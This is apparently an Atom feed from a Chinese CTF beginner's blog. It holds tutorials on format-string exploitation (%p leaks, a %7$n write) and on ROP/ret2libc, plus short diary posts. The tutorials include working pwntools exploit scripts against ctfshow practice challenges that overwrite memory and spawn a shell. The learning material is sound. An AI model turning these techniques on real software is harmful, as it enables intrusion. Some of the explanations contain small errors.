    <title>初识格式化字符串（下）</title>
    <link href="https://jiutian521.github.io/posts/7e846c6a.html"/>
    <id>https://jiutian521.github.io/posts/7e846c6a.html</id>
    <published>2025-11-08T16:00:00.000Z</published>
    <updated>2025-11-09T03:47:22.768Z</updated>
    
    <content type="html"><![CDATA[<p>在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存</p><h1 id="开挂的-n"><a href="#开挂的-n" class="headerlink" title="开挂的%n"></a>开挂的%n</h1><p>%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中</p><blockquote><p>printf(“包含%n的格式字符串”, …, &amp;变量名);</p></blockquote><p>比较特殊的是，%n对应的参数必须是一个指向整数的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int count;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Hello, world!%n\n&quot;, &amp;count);</span><br><span class="line">    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：<br>Hello, world!<br>上面那行输出了 13 个字符。</p><p>也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1</p><h1 id="利用-n覆盖内存实战"><a href="#利用-n覆盖内存实战" class="headerlink" title="利用%n覆盖内存实战"></a>利用%n覆盖内存实战</h1><p>主要分以下三个步骤：<br>1.确定覆盖地址<br>2.确定相对偏移<br>3.进行覆盖  </p><h2 id="eg2-ctfshow-pwn入门91"><a href="#eg2-ctfshow-pwn入门91" class="headerlink" title="eg2.ctfshow pwn入门91"></a>eg2.ctfshow pwn入门91</h2><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-22.102l3ea63n.webp"></p><p>logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  </p><p>我们进ctfshow函数看一下</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-44.6m4bh9bgwy.webp"></p><p>首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-20-17.2h8q55eau9.webp"></p><p>我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的</p><p>下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数</p><p>有以下两种方法</p><h3 id="手测"><a href="#手测" class="headerlink" title="手测"></a>手测</h3><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_20-09-33.6pnxezpvav.webp"></p><p>aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读</p><p>这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说</p><p>有了覆盖地址和偏移量，我们就可以进行覆盖了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)</span><br><span class="line">#offset = 7</span><br><span class="line">daniu_addr = 0x0804B038</span><br><span class="line">payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>我们来逐步理解一下这段payload<br>前面我们提到，%n对应的参数必须是一个指向整数的<strong>指针</strong>,也就是必须是一个<strong>地址</strong></p><p>我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上</p><p>然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，</p><p>我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr</p><p>让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6</p><p>特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。</p><p>最后我们通过输出也可以看到daniu的值被改成了6<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-09_09-34-02.45i335g03m.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存&lt;/p&gt;
&lt;h1 id=&quot;开挂的-n&quot;&gt;&lt;a href=&quot;#开挂的-n&quot; class=&quot;headerlink&quot; title=&quot;开挂的</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="格式化字符串" scheme="https://jiutian521.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>初识格式化字符串（上）</title>
    <link href="https://jiutian521.github.io/posts/c6380b0f.html"/>
    <id>https://jiutian521.github.io/posts/c6380b0f.html</id>
    <published>2025-11-07T16:00:00.000Z</published>
    <updated>2025-11-09T03:55:39.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入理解格式化字符串"><a href="#深入理解格式化字符串" class="headerlink" title="深入理解格式化字符串"></a>深入理解格式化字符串</h1><p>要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如<code>printf(&quot;%d %f\n&quot;, x, y);</code>，它的一参是x吗？</p><p>让我们来看看printf的声明，<code>int printf(const char *format, ...)</code>，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的</p><p>我们必须要深刻理解的第二个问题是，什么是格式化字符串</p><blockquote><p>格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的<strong>函数</strong>，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。</p></blockquote><p>（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）</p><p>通俗的说，它就是包含格式化占位符的字符串</p><h1 id="格式化字符串的工作原理"><a href="#格式化字符串的工作原理" class="headerlink" title="格式化字符串的工作原理"></a>格式化字符串的工作原理</h1><p>我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数</p><p>这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b,c);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>而我们去掉了参数c会发生什么呢</p><p>结果会是：1 2 一个很奇怪的数</p><p>因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %p&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>我们把占位符改成%p，输出的结果就是c在栈上的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char a[]</span><br><span class="line">scanf(&quot;%s&quot;,&amp;)</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>更极端的情况如上</p><p>因此，我们可以利用格式化字符串实现可读可写</p><h2 id="eg1：newstar2025-week2-刻在栈上的秘密"><a href="#eg1：newstar2025-week2-刻在栈上的秘密" class="headerlink" title="eg1：newstar2025 week2 刻在栈上的秘密"></a>eg1：newstar2025 week2 刻在栈上的秘密</h2><blockquote><p>题目内容：<br>欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？</p></blockquote><p>这个题没有给我们可执行文件，直接nc链接做即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-05-19.6ikpjc8t42.webp" alt="题目"></p><p>我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-35-18.54y6fb4kh0.webp"></p><p>下面开始正式做题</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-41-25.6ikpjcngqj.webp"></p><p>我们可以看到，第11个%p打印出了密码所在寄存器的地址</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-18.5c1earqu49.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-24.7eh6ytpf5k.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入理解格式化字符串&quot;&gt;&lt;a href=&quot;#深入理解格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;深入理解格式化字符串&quot;&gt;&lt;/a&gt;深入理解格式化字符串&lt;/h1&gt;&lt;p&gt;要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="格式化字符串" scheme="https://jiutian521.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
    <link href="https://jiutian521.github.io/posts/d4f00467.html"/>
    <id>https://jiutian521.github.io/posts/d4f00467.html</id>
    <published>2025-11-05T04:00:00.000Z</published>
    <updated>2025-11-06T01:38:37.362Z</updated>
    
    <content type="html"><![CDATA[<p>今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存</p><p>看一下左下角的时间，如果是now那就证明保存了</p><p>另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了</p><p>最后，感谢我磊哥再一次救我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存&lt;/p&gt;
&lt;p&gt;看一下左下角的时间，如果是now那就证明保存了&lt;/p&gt;
&lt;p&gt;另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以</summary>
      
    
    
    
    <category term="碎碎念" scheme="https://jiutian521.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
  </entry>
  
  <entry>
    <title>梦开始的地方</title>
    <link href="https://jiutian521.github.io/posts/1234.html"/>
    <id>https://jiutian521.github.io/posts/1234.html</id>
    <published>2025-11-02T10:00:00.000Z</published>
    <updated>2025-11-06T01:38:44.638Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客搭建终于好了！</p><p>从今天起，我会在我的博客上分享我的<strong>wp</strong>，以及一些<strong>CTF的日常</strong>，希望和大家一起多多交流！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客搭建终于好了！&lt;/p&gt;
&lt;p&gt;从今天起，我会在我的博客上分享我的&lt;strong&gt;wp&lt;/strong&gt;，以及一些&lt;strong&gt;CTF的日常&lt;/strong&gt;，希望和大家一起多多交流！&lt;/p&gt;
</summary>
      
    
    
    
    <category term="碎碎念" scheme="https://jiutian521.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
  </entry>
  
  <entry>
    <title>初识32位下的ret2libc</title>
    <link href="https://jiutian521.github.io/posts/b342ee9.html"/>
    <id>https://jiutian521.github.io/posts/b342ee9.html</id>
    <published>2025-11-01T04:30:00.000Z</published>
    <updated>2025-11-17T08:19:19.421Z</updated>
    
    <content type="html"><![CDATA[<p>从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。</p><p>ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处</p><p>egctfshow pwn入门39&amp;41<br>这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh</p><p>首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b583a12117.png" alt="Snipaste_2025-11-05_21-59-53.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b58632beb8.png" alt="Snipaste_2025-11-05_22-00-37.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>整个流程如下：</p><p>1.函数返回，执行 ret → 跳到 gets</p><p>2.gets(buf2) 读取我们下一次 sendline 的 “&#x2F;bin&#x2F;sh”</p><p>3.gets 执行完后 ret → 跳到 system</p><p>4.system(buf2) → 执行 &#x2F;bin&#x2F;sh，获得 shell</p><p>让chatgpt帮忙画了一个栈图</p><table><thead><tr><th>地址</th><th>内容</th><th>含义</th></tr></thead><tbody><tr><td>ESP+12</td><td>buf2</td><td>system(“&#x2F;bin&#x2F;sh”) 参数</td></tr><tr><td>ESP+8</td><td>buf2</td><td>gets(buf2) 参数</td></tr><tr><td>ESP+4</td><td>system</td><td>gets 返回后跳到这里</td></tr><tr><td>ESP</td><td>gets</td><td>ret → gets</td></tr><tr><td></td><td>（低地址）</td><td></td></tr></tbody></table><p>要特别注意的是，我们的payload并不直接执行压栈操作，而是覆盖内存，因此此我们不能用简单的先进后出来解释payload的顺序。我们必须知道，内存的写入方向是从低地址向高地址，虽然内存增长和栈增长没有必然关系，但是我们直观上可以理解为两者的方向是相反的</p><p>在溢出中，我们只能覆盖返回地址,不能直接移动ESP。<br>ret指令会自动让ESP上移到返回地址的位置，并读取该地址。<br>因此，我们把gets写到返回地址处，而不是尝试让ESP指向gets</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-15_10-34-15.64ea24dy1k.webp"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5886da79b.png" alt="Snipaste_2025-11-05_22-01-12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。&lt;/p&gt;
&lt;p&gt;ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>初识ROP和ret2shellcode</title>
    <link href="https://jiutian521.github.io/posts/2b89d936.html"/>
    <id>https://jiutian521.github.io/posts/2b89d936.html</id>
    <published>2025-11-01T04:00:00.000Z</published>
    <updated>2025-11-23T10:04:54.662Z</updated>
    
    <content type="html"><![CDATA[<p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p><p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png"></p><p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p><p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p><p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p><p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p><p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。</p><p>动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p><p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。</p><p>GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p><p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png"></p><p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png"></p><p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p><p>我们用gdb调试一下，验证这段exp是否正确。</p><p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png"></p><p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p><p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png"></p><p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。&lt;/p&gt;
&lt;p&gt;何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&amp;#x2F;</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
    
  </entry>
  
</feed>
